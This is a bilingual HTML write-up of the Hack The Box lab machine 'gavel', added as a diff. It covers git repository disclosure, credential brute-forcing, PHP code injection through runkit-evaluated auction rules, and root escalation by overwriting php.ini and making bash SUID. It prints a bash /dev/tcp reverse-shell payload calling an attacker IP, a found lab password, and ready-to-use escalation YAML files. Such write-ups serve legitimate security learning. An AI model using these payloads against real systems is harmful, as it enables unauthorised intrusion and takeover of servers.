@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gavel | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">gavel</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine ran an auction web application with exposed <code>.git</code> repository allowing source code analysis. Through credential brute-forcing, I gained access to the auctioneer admin panel, where I could modify auction item rules.</p>
+                    
+                    <p>These rules were dynamically evaluated as PHP code using the <code>runkit</code> extension, enabling arbitrary PHP code execution. By injecting a reverse shell payload into a rule and triggering it through a bid, I obtained initial access as <code>www-data</code>.</p>
+                    
+                    <p>Lateral movement to the <code>auctioneer</code> user was achieved using the same credentials from the web panel. For privilege escalation, I exploited the <code>gavel-util</code> binary which processed YAML files with PHP rule evaluation. Although PHP functions were restricted via <code>php.ini</code>, the <code>open_basedir</code> configuration allowed writing to <code>/opt/gavel</code> where the <code>php.ini</code> file was located. By overwriting this configuration file to remove function restrictions and then executing a command to make <code>/bin/bash</code> SUID, I achieved root access.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Git repository disclosure, credential brute-forcing, PHP dynamic function creation with runkit, PHP code injection, php.ini configuration override, SUID privilege escalation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services:</p>
+                <p><img src="./media/image5.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" /></p>
+
+                <p>The scan reveals SSH on port 22 and HTTP on port 80. I add <code>gavel.htb</code> to my <code>/etc/hosts</code> file to resolve the domain.</p>
+
+                <h2>Web Application Enumeration</h2>
+                <p>The web application is an auction platform where users can register, log in, and place bids on items. I create an account and explore the functionality, testing various features like bidding and inventory management.</p>
+
+                <p>Running a gobuster directory scan reveals several interesting endpoints:</p>
+                <p><img src="./media/image3.png" alt="Gobuster scan results showing discovered directories including admin panel" /></p>
+
+                <p>The presence of an <code>/admin</code> directory suggests there's an administrative panel that requires elevated privileges to access.</p>
+
+                <h3>Exploring Inventory Functionality</h3>
+                <p>In <code>inventory.php</code>, I can filter items by name or quantity. The filtering functionality sends a POST request with the following body:</p>
+                <pre><code class="language-http">user_id=2&sort=quantity</code></pre>
+
+                <p>By modifying the <code>user_id</code> parameter to <code>1</code>, I can view another user's inventory items, confirming the existence of at least one other user in the system.</p>
+
+                <h3>Exposed Git Repository</h3>
+                <p>Continuing enumeration with a more comprehensive wordlist, I discover an exposed <code>.git</code> directory:</p>
+                <p><img src="./media/image4.png" alt="Directory scan showing exposed .git repository with various git objects and files" /></p>
+
+                <p>This is a significant finding as it allows me to download the entire source code repository. I use <code>git-dumper</code> to extract the repository:</p>
+                <pre><code class="language-bash">git-dumper http://gavel.htb/.git/ gavel-source</code></pre>
+
+                <h2>Source Code Analysis</h2>
+                <p>Reviewing the downloaded PHP source code, I discover a particularly interesting code snippet that handles auction rule validation:</p>
+                <pre><code class="language-php">if (function_exists('ruleCheck')) {
+    runkit_function_remove('ruleCheck');
+}
+runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
+error_log("Rule: " . $rule);
+$allowed = ruleCheck($current_bid, $previous_bid, $bidder);</code></pre>
+
+                <p>This code uses the <code>runkit</code> extension to dynamically create functions at runtime. The <code>$rule</code> variable contains PHP code that gets executed as part of the function body. The rules are defined in YAML format:</p>
+                <pre><code class="language-yaml">rules:
+  - rule: "return $current_bid >= $previous_bid * 1.1;"
+    message: "Bid at least 10% more than the current price."
+  - rule: "return $current_bid % 5 == 0;"
+    message: "Bids must be in multiples of 5."
+  - rule: "return $current_bid >= $previous_bid + 5000;"
+    message: "Only bids greater than 5000 + current bid will be considered."</code></pre>
+
+                <p>Since the <code>rule</code> field contains PHP code that gets executed directly, if I can control this value, I can inject arbitrary PHP commands for code execution.</p>
+
+                <h3>SQL Injection Investigation</h3>
+                <p>I also notice a potential SQL injection point in the inventory sorting functionality:</p>
+                <pre><code class="language-php">$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
+$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
+$col = "`" . str_replace("`", "", $sortItem) . "`";
+
+if ($sortItem === 'quantity') {
+    $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
+    $stmt->execute([$userId]);
+} else {
+    $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
+    $stmt->execute([$userId]);
+}</code></pre>
+
+                <p>However, after extensive testing and research, I conclude that SQL injection is not feasible here because the backticks surrounding <code>$col</code> cannot be escaped, effectively neutralizing any injection attempts.</p>
+
+                <h2>Gaining Admin Access</h2>
+                <p>Analyzing the admin panel protection code:</p>
+                <pre><code class="language-php">if (!isset($_SESSION['user']) || $_SESSION['user']['role'] !== 'auctioneer') {
+    header('Location: index.php');
+    exit;
+}</code></pre>
+
+                <p>This code only checks that the user role is <code>auctioneer</code>, not the specific username. Based on this, I assume the admin username is likely <code>auctioneer</code>.</p>
+
+                <p>I use <code>caido</code> to perform a brute-force attack against the login POST endpoint. After some time, I successfully discover valid credentials:</p>
+                <pre><code class="language-plaintext">auctioneer:midnight1</code></pre>
+
+                <h2>Initial Access - PHP Code Injection</h2>
+                <p>Logging in with the auctioneer credentials grants me access to the administrative panel where I can edit auction items in real-time:</p>
+                <p><img src="./media/image1.png" alt="Admin panel interface showing the ability to edit auction item rules" /></p>
+
+                <p>This is exactly what I need to exploit the dynamic PHP function creation vulnerability I discovered earlier. Since I can edit the <code>rule</code> field, I can inject arbitrary PHP code that will be executed when the rule is evaluated.</p>
+
+                <h3>Crafting the Payload</h3>
+                <p>I modify an item's rule to include a reverse shell payload:</p>
+                <p><img src="./media/image2.png" alt="Modified rule containing PHP reverse shell payload" /></p>
+
+                <p>The injected rule contains a PHP reverse shell that will connect back to my machine:</p>
+                <pre><code class="language-php">return system('bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"');</code></pre>
+
+                <p>I set up a netcat listener on my attacking machine:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Then, I switch back to my regular user account and place a bid on the modified item with a valid amount. When the system evaluates the rule to check if my bid is valid, it executes my injected PHP code, triggering the reverse shell.</p>
+
+                <p>I successfully receive the connection and obtain shell access as the <code>www-data</code> user.</p>
+
+                <h2>Lateral Movement to Auctioneer User</h2>
+                <p>Exploring the system, I find the <code>auctioneer</code> user in <code>/home</code>. Checking the user's group memberships:</p>
+                <pre><code class="language-bash">id auctioneer</code></pre>
+                <pre><code class="language-plaintext">uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)</code></pre>
+
+                <p>The <code>gavel-seller</code> group looks interesting. I attempt to switch to the auctioneer user using the same credentials from the web application:</p>
+                <pre><code class="language-bash">su - auctioneer</code></pre>
+
+                <p>The password reuse works, and I successfully switch to the <code>auctioneer</code> user. Note that SSH is not enabled for this user, which explains why the initial reverse shell was necessary.</p>
+
+                <h2>Privilege Escalation - Gavel-Util Binary</h2>
+                <p>I search for files accessible by the <code>gavel-seller</code> group:</p>
+                <pre><code class="language-bash">find / -group gavel-seller 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/run/gaveld.sock
+/usr/local/bin/gavel-util</code></pre>
+
+                <p>The <code>gavel-util</code> binary is particularly interesting. Let me examine its functionality:</p>
+                <pre><code class="language-bash">gavel-util</code></pre>
+                <pre><code class="language-plaintext">Usage: gavel-util <cmd> [options]
+Commands:
+  submit <file>    Submit new items (YAML format)
+  stats            Show Auction stats
+  invoice          Request invoice</code></pre>
+
+                <p>I transfer the binary to my local machine for analysis:</p>
+                <pre><code class="language-bash">file /usr/local/bin/gavel-util</code></pre>
+                <pre><code class="language-plaintext">/usr/local/bin/gavel-util: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=941cf63911b2f8f4cabff61062f2c9ad64f043d6, for GNU/Linux 3.2.0, not stripped</code></pre>
+
+                <h3>Testing PHP Execution</h3>
+                <p>I focus on the <code>submit</code> command since it accepts user input. Creating a test YAML file:</p>
+                <pre><code class="language-yaml">price: 2
+rule_msg: asd
+rule: print('xdd');
+name: xd
+image: no_image
+description: xd</code></pre>
+
+                <p>Submitting this file:</p>
+                <pre><code class="language-bash">gavel-util submit items.yaml</code></pre>
+                <pre><code class="language-plaintext">Illegal rule or sandbox violation.xddSANDBOX_RETURN_ERROR</code></pre>
+
+                <p>The output shows that <code>print('xdd')</code> was executed (hence "xdd" in the output), confirming PHP code execution is possible!</p>
+
+                <h3>PHP Restrictions Discovery</h3>
+                <p>However, attempting to use <code>system()</code> reveals restrictions:</p>
+                <pre><code class="language-bash">gavel-util submit items.yaml</code></pre>
+                <pre><code class="language-plaintext">Illegal rule or sandbox violation.
+Warning: system() has been disabled for security reasons in Command line code on line 1
+SANDBOX_RETURN_ERROR</code></pre>
+
+                <p>The same restriction applies to <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>, <code>popen()</code>, and <code>proc_open()</code>.</p>
+
+                <p>After exploring the system, I discover PHP configuration files in <code>/opt/gavel</code>:</p>
+                <pre><code class="language-bash">cat /opt/gavel/.config/php/php.ini</code></pre>
+                <pre><code class="language-ini">engine=On
+display_errors=On
+display_startup_errors=On
+log_errors=Off
+error_reporting=E_ALL
+open_basedir=/opt/gavel
+memory_limit=32M
+max_execution_time=3
+max_input_time=10
+disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
+scan_dir=
+allow_url_fopen=Off
+allow_url_include=Off</code></pre>
+
+                <p>The <code>disable_functions</code> directive explains why command execution functions don't work. However, I notice an important detail: the <code>open_basedir</code> restriction only allows writing to <code>/opt/gavel</code> - which is exactly where the <code>php.ini</code> file is located!</p>
+
+                <h3>PHP.ini Configuration Override</h3>
+                <p>Testing the <code>open_basedir</code> restriction:</p>
+                <pre><code class="language-bash">gavel-util submit items.yaml</code></pre>
+                <pre><code class="language-plaintext">Illegal rule or sandbox violation.
+Warning: file_put_contents(): open_basedir restriction in effect. File(xd.txt) is not within the allowed path(s): (/opt/gavel) in Command line code on line 1</code></pre>
+
+                <p>This confirms I can only write within <code>/opt/gavel</code>, but that's perfect since I can overwrite the <code>php.ini</code> file itself!</p>
+
+                <h3>Exploitation Strategy</h3>
+                <p>My attack plan is:</p>
+                <ol>
+                    <li>Create a YAML file that overwrites <code>php.ini</code> to remove function restrictions</li>
+                    <li>Create another YAML file that makes <code>/bin/bash</code> SUID</li>
+                    <li>Execute both files in sequence with <code>gavel-util</code></li>
+                    <li>Launch a privileged bash shell</li>
+                </ol>
+
+                <p>First YAML file to remove restrictions (<code>remove_restrictions.yaml</code>):</p>
+                <pre><code class="language-yaml">price: 2
+rule_msg: asd
+rule: "return file_put_contents('/opt/gavel/.config/php/php.ini', 'engine=On\ndisplay_errors=On\ndisplay_startup_errors=On\nlog_errors=Off\nerror_reporting=E_ALL\nopen_basedir=/opt/gavel\nmemory_limit=32M\nmax_execution_time=3\nmax_input_time=10\ndisable_functions=\nscan_dir=\nallow_url_fopen=Off\nallow_url_include=Off\n');"
+name: xd
+image: no_image
+description: xd</code></pre>
+
+                <p>Second YAML file to make bash SUID (<code>make_suid.yaml</code>):</p>
+                <pre><code class="language-yaml">price: 2
+rule_msg: asd
+rule: "return system('chmod u+s /bin/bash');"
+name: xd
+image: no_image
+description: xd</code></pre>
+
+                <p>Executing the attack:</p>
+                <pre><code class="language-bash">gavel-util submit remove_restrictions.yaml
+gavel-util submit make_suid.yaml</code></pre>
+
+                <p>Now I can spawn a privileged bash shell:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <p>I now have root access and can retrieve the root flag.</p>
+
+                <h3>Cleanup</h3>
+                <p>Since this is a shared machine environment, I clean up my modifications to avoid interfering with other players:</p>
+                <pre><code class="language-bash">chmod u-s /bin/bash</code></pre>
+
+                <p>I also restore the original <code>php.ini</code> restrictions and remove the YAML files I created.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación web de subastas con un repositorio <code>.git</code> expuesto que permitía analizar el código fuente. Mediante fuerza bruta de credenciales, obtuve acceso al panel de administración auctioneer, donde podía modificar las reglas de los artículos de la subasta.</p>
+                    
+                    <p>Estas reglas se evaluaban dinámicamente como código PHP utilizando la extensión <code>runkit</code>, permitiendo la ejecución arbitraria de código PHP. Inyectando un payload de reverse shell en una regla y activándola mediante una puja, obtuve acceso inicial como <code>www-data</code>.</p>
+                    
+                    <p>El movimiento lateral al usuario <code>auctioneer</code> se logró utilizando las mismas credenciales del panel web. Para la escalada de privilegios, exploté el binario <code>gavel-util</code> que procesaba archivos YAML con evaluación de reglas PHP. Aunque las funciones PHP estaban restringidas mediante <code>php.ini</code>, la configuración <code>open_basedir</code> permitía escribir en <code>/opt/gavel</code> donde se encontraba el archivo <code>php.ini</code>. Sobrescribiendo este archivo de configuración para eliminar las restricciones de funciones y luego ejecutando un comando para hacer SUID a <code>/bin/bash</code>, conseguí acceso root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Divulgación de repositorio Git, fuerza bruta de credenciales, creación dinámica de funciones PHP con runkit, inyección de código PHP, sobreescritura de configuración php.ini, escalada de privilegios mediante SUID.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios:</p>
+                <p><img src="./media/image5.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" /></p>
+
+                <p>El escaneo revela SSH en el puerto 22 y HTTP en el puerto 80. Añado <code>gavel.htb</code> a mi archivo <code>/etc/hosts</code> para resolver el dominio.</p>
+
+                <h2>Enumeración de la Aplicación Web</h2>
+                <p>La aplicación web es una plataforma de subastas donde los usuarios pueden registrarse, iniciar sesión y pujar por artículos. Creo una cuenta y exploro la funcionalidad, probando varias características como pujar y gestionar el inventario.</p>
+
+                <p>Ejecutando un escaneo de directorios con gobuster revela varios endpoints interesantes:</p>
+                <p><img src="./media/image3.png" alt="Resultados del escaneo de gobuster mostrando directorios descubiertos incluyendo el panel de administración" /></p>
+
+                <p>La presencia del directorio <code>/admin</code> sugiere que hay un panel administrativo que requiere privilegios elevados para acceder.</p>
+
+                <h3>Explorando la Funcionalidad del Inventario</h3>
+                <p>En <code>inventory.php</code>, puedo filtrar artículos por nombre o cantidad. La funcionalidad de filtrado envía una petición POST con el siguiente cuerpo:</p>
+                <pre><code class="language-http">user_id=2&sort=quantity</code></pre>
+
+                <p>Modificando el parámetro <code>user_id</code> a <code>1</code>, puedo ver los artículos del inventario de otro usuario, confirmando la existencia de al menos otro usuario en el sistema.</p>
+
+                <h3>Repositorio Git Expuesto</h3>
+                <p>Continuando la enumeración con un diccionario más completo, descubro un directorio <code>.git</code> expuesto:</p>
+                <p><img src="./media/image4.png" alt="Escaneo de directorio mostrando repositorio .git expuesto con varios objetos y archivos git" /></p>
+
+                <p>Este es un hallazgo significativo ya que me permite descargar todo el código fuente del repositorio. Uso <code>git-dumper</code> para extraer el repositorio:</p>
+                <pre><code class="language-bash">git-dumper http://gavel.htb/.git/ gavel-source</code></pre>
+
+                <h2>Análisis del Código Fuente</h2>
+                <p>Revisando el código fuente PHP descargado, descubro un fragmento de código particularmente interesante que maneja la validación de reglas de subasta:</p>
+                <pre><code class="language-php">if (function_exists('ruleCheck')) {
+    runkit_function_remove('ruleCheck');
+}
+runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
+error_log("Rule: " . $rule);
+$allowed = ruleCheck($current_bid, $previous_bid, $bidder);</code></pre>
+
+                <p>Este código utiliza la extensión <code>runkit</code> para crear funciones dinámicamente en tiempo de ejecución. La variable <code>$rule</code> contiene código PHP que se ejecuta como parte del cuerpo de la función. Las reglas se definen en formato YAML:</p>
+                <pre><code class="language-yaml">rules:
+  - rule: "return $current_bid >= $previous_bid * 1.1;"
+    message: "Puja al menos 10% más que el precio actual."
+  - rule: "return $current_bid % 5 == 0;"
+    message: "Las pujas deben ser múltiplos de 5."
+  - rule: "return $current_bid >= $previous_bid + 5000;"
+    message: "Solo se consideran pujas mayores de 5000 + puja actual."</code></pre>
+
+                <p>Dado que el campo <code>rule</code> contiene código PHP que se ejecuta directamente, si puedo controlar este valor, puedo inyectar comandos PHP arbitrarios para conseguir ejecución de código.</p>
+
+                <h3>Investigación de Inyección SQL</h3>
+                <p>También noto un potencial punto de inyección SQL en la funcionalidad de ordenación del inventario:</p>
+                <pre><code class="language-php">$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
+$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
+$col = "`" . str_replace("`", "", $sortItem) . "`";
+
+if ($sortItem === 'quantity') {
+    $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
+    $stmt->execute([$userId]);
+} else {
+    $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
+    $stmt->execute([$userId]);
+}</code></pre>
+
+                <p>Sin embargo, después de pruebas exhaustivas e investigación, concluyo que la inyección SQL no es factible aquí porque las comillas invertidas que rodean <code>$col</code> no pueden ser escapadas, neutralizando efectivamente cualquier intento de inyección.</p>
+
+                <h2>Obteniendo Acceso de Administrador</h2>
+                <p>Analizando el código de protección del panel de administración:</p>
+                <pre><code class="language-php">if (!isset($_SESSION['user']) || $_SESSION['user']['role'] !== 'auctioneer') {
+    header('Location: index.php');
+    exit;
+}</code></pre>
+
+                <p>Este código solo comprueba que el rol del usuario sea <code>auctioneer</code>, no el nombre de usuario específico. Basándome en esto, asumo que el nombre de usuario de administrador probablemente sea <code>auctioneer</code>.</p>
+
+                <p>Utilizo <code>caido</code> para realizar un ataque de fuerza bruta contra el endpoint POST del login. Después de un tiempo, descubro exitosamente credenciales válidas:</p>
+                <pre><code class="language-plaintext">auctioneer:midnight1</code></pre>
+
+                <h2>Acceso Inicial - Inyección de Código PHP</h2>
+                <p>Iniciando sesión con las credenciales de auctioneer me otorga acceso al panel administrativo donde puedo editar artículos de la subasta en tiempo real:</p>
+                <p><img src="./media/image1.png" alt="Interfaz del panel de administración mostrando la capacidad de editar reglas de artículos de subasta" /></p>
+
+                <p>Esto es exactamente lo que necesito para explotar la vulnerabilidad de creación dinámica de funciones PHP que descubrí anteriormente. Como puedo editar el campo <code>rule</code>, puedo inyectar código PHP arbitrario que se ejecutará cuando se evalúe la regla.</p>
+
+                <h3>Creando el Payload</h3>
+                <p>Modifico la regla de un artículo para incluir un payload de reverse shell:</p>
+                <p><img src="./media/image2.png" alt="Regla modificada conteniendo payload de reverse shell PHP" /></p>
+
+                <p>La regla inyectada contiene una reverse shell PHP que se conectará de vuelta a mi máquina:</p>
+                <pre><code class="language-php">return system('bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"');</code></pre>
+
+                <p>Configuro un listener de netcat en mi máquina atacante:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Luego, vuelvo a mi cuenta de usuario normal y pongo una puja en el artículo modificado con una cantidad válida. Cuando el sistema evalúa la regla para comprobar si mi puja es válida, ejecuta mi código PHP inyectado, activando la reverse shell.</p>
+
+                <p>Recibo exitosamente la conexión y obtengo acceso shell como el usuario <code>www-data</code>.</p>
+
+                <h2>Movimiento Lateral al Usuario Auctioneer</h2>
+                <p>Explorando el sistema, encuentro el usuario <code>auctioneer</code> en <code>/home</code>. Comprobando las membresías de grupo del usuario:</p>
+                <pre><code class="language-bash">id auctioneer</code></pre>
+                <pre><code class="language-plaintext">uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)</code></pre>
+
+                <p>El grupo <code>gavel-seller</code> parece interesante. Intento cambiar al usuario auctioneer utilizando las mismas credenciales de la aplicación web:</p>
+                <pre><code class="language-bash">su - auctioneer</code></pre>
+
+                <p>La reutilización de contraseña funciona, y cambio exitosamente al usuario <code>auctioneer</code>. Nótese que SSH no está habilitado para este usuario, lo que explica por qué la reverse shell inicial era necesaria.</p>
+
+                <h2>Escalada de Privilegios - Binario Gavel-Util</h2>
+                <p>Busco archivos accesibles por el grupo <code>gavel-seller</code>:</p>
+                <pre><code class="language-bash">find / -group gavel-seller 2>/dev/null</code></pre>
+                <pre><code class="language-plaintext">/run/gaveld.sock
+/usr/local/bin/gavel-util</code></pre>
+
+                <p>El binario <code>gavel-util</code> es particularmente interesante. Examino su funcionalidad:</p>
+                <pre><code class="language-bash">gavel-util</code></pre>
+                <pre><code class="language-plaintext">Usage: gavel-util <cmd> [options]
+Commands:
+  submit <file>    Submit new items (YAML format)
+  stats            Show Auction stats
+  invoice          Request invoice</code></pre>
+
+                <p>Transfiero el binario a mi máquina local para análisis:</p>
+                <pre><code class="language-bash">file /usr/local/bin/gavel-util</code></pre>
+                <pre><code class="language-plaintext">/usr/local/bin/gavel-util: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=941cf63911b2f8f4cabff61062f2c9ad64f043d6, for GNU/Linux 3.2.0, not stripped</code></pre>
+
+                <h3>Probando Ejecución PHP</h3>
+                <p>Me centro en el comando <code>submit</code> ya que acepta entrada del usuario. Creando un archivo YAML de prueba:</p>
+                <pre><code class="language-yaml">price: 2
+rule_msg: asd
+rule: print('xdd');
+name: xd
+image: no_image
+description: xd</code></pre>
+
+                <p>Enviando este archivo:</p>
+                <pre><code class="language-bash">gavel-util submit items.yaml</code></pre>
+                <pre><code class="language-plaintext">Illegal rule or sandbox violation.xddSANDBOX_RETURN_ERROR</code></pre>
+
+                <p>¡La salida muestra que <code>print('xdd')</code> fue ejecutado (de ahí "xdd" en la salida), confirmando que la ejecución de código PHP es posible!</p>
+
+                <h3>Descubrimiento de Restricciones PHP</h3>
+                <p>Sin embargo, intentar usar <code>system()</code> revela restricciones:</p>
+                <pre><code class="language-bash">gavel-util submit items.yaml</code></pre>
+                <pre><code class="language-plaintext">Illegal rule or sandbox violation.
+Warning: system() has been disabled for security reasons in Command line code on line 1
+SANDBOX_RETURN_ERROR</code></pre>
+
+                <p>La misma restricción se aplica a <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>, <code>popen()</code> y <code>proc_open()</code>.</p>
+
+                <p>Después de explorar el sistema, descubro archivos de configuración PHP en <code>/opt/gavel</code>:</p>
+                <pre><code class="language-bash">cat /opt/gavel/.config/php/php.ini</code></pre>
+                <pre><code class="language-ini">engine=On
+display_errors=On
+display_startup_errors=On
+log_errors=Off
+error_reporting=E_ALL
+open_basedir=/opt/gavel
+memory_limit=32M
+max_execution_time=3
+max_input_time=10
+disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
+scan_dir=
+allow_url_fopen=Off
+allow_url_include=Off</code></pre>
+
+                <p>La directiva <code>disable_functions</code> explica por qué las funciones de ejecución de comandos no funcionan. Sin embargo, noto un detalle importante: la restricción <code>open_basedir</code> solo permite escribir en <code>/opt/gavel</code> - ¡que es exactamente donde está ubicado el archivo <code>php.ini</code>!</p>
+
+                <h3>Sobreescritura de Configuración php.ini</h3>
+                <p>Probando la restricción <code>open_basedir</code>:</p>
+                <pre><code class="language-bash">gavel-util submit items.yaml</code></pre>
+                <pre><code class="language-plaintext">Illegal rule or sandbox violation.
+Warning: file_put_contents(): open_basedir restriction in effect. File(xd.txt) is not within the allowed path(s): (/opt/gavel) in Command line code on line 1</code></pre>
+
+                <p>Esto confirma que solo puedo escribir dentro de <code>/opt/gavel</code>, ¡pero eso es perfecto ya que puedo sobrescribir el propio archivo <code>php.ini</code>!</p>
+
+                <h3>Estrategia de Explotación</h3>
+                <p>Mi plan de ataque es:</p>
+                <ol>
+                    <li>Crear un archivo YAML que sobrescriba <code>php.ini</code> para eliminar restricciones de funciones</li>
+                    <li>Crear otro archivo YAML que haga SUID a <code>/bin/bash</code></li>
+                    <li>Ejecutar ambos archivos en secuencia con <code>gavel-util</code></li>
+                    <li>Lanzar una shell bash privilegiada</li>
+                </ol>
+
+                <p>Primer archivo YAML para eliminar restricciones (<code>remove_restrictions.yaml</code>):</p>
+                <pre><code class="language-yaml">price: 2
+rule_msg: asd
+rule: "return file_put_contents('/opt/gavel/.config/php/php.ini', 'engine=On\ndisplay_errors=On\ndisplay_startup_errors=On\nlog_errors=Off\nerror_reporting=E_ALL\nopen_basedir=/opt/gavel\nmemory_limit=32M\nmax_execution_time=3\nmax_input_time=10\ndisable_functions=\nscan_dir=\nallow_url_fopen=Off\nallow_url_include=Off\n');"
+name: xd
+image: no_image
+description: xd</code></pre>
+
+                <p>Segundo archivo YAML para hacer bash SUID (<code>make_suid.yaml</code>):</p>
+                <pre><code class="language-yaml">price: 2
+rule_msg: asd
+rule: "return system('chmod u+s /bin/bash');"
+name: xd
+image: no_image
+description: xd</code></pre>
+
+                <p>Ejecutando el ataque:</p>
+                <pre><code class="language-bash">gavel-util submit remove_restrictions.yaml
+gavel-util submit make_suid.yaml</code></pre>
+
+                <p>Ahora puedo lanzar una shell bash privilegiada:</p>
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <p>Ahora tengo acceso root y puedo recuperar la flag de root.</p>
+
+                <h3>Limpieza</h3>
+                <p>Como este es un entorno de máquina compartida, limpio mis modificaciones para evitar interferir con otros jugadores:</p>
+                <pre><code class="language-bash">chmod u-s /bin/bash</code></pre>
+
+                <p>También restauro las restricciones originales de <code>php.ini</code> y elimino los archivos YAML que creé.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
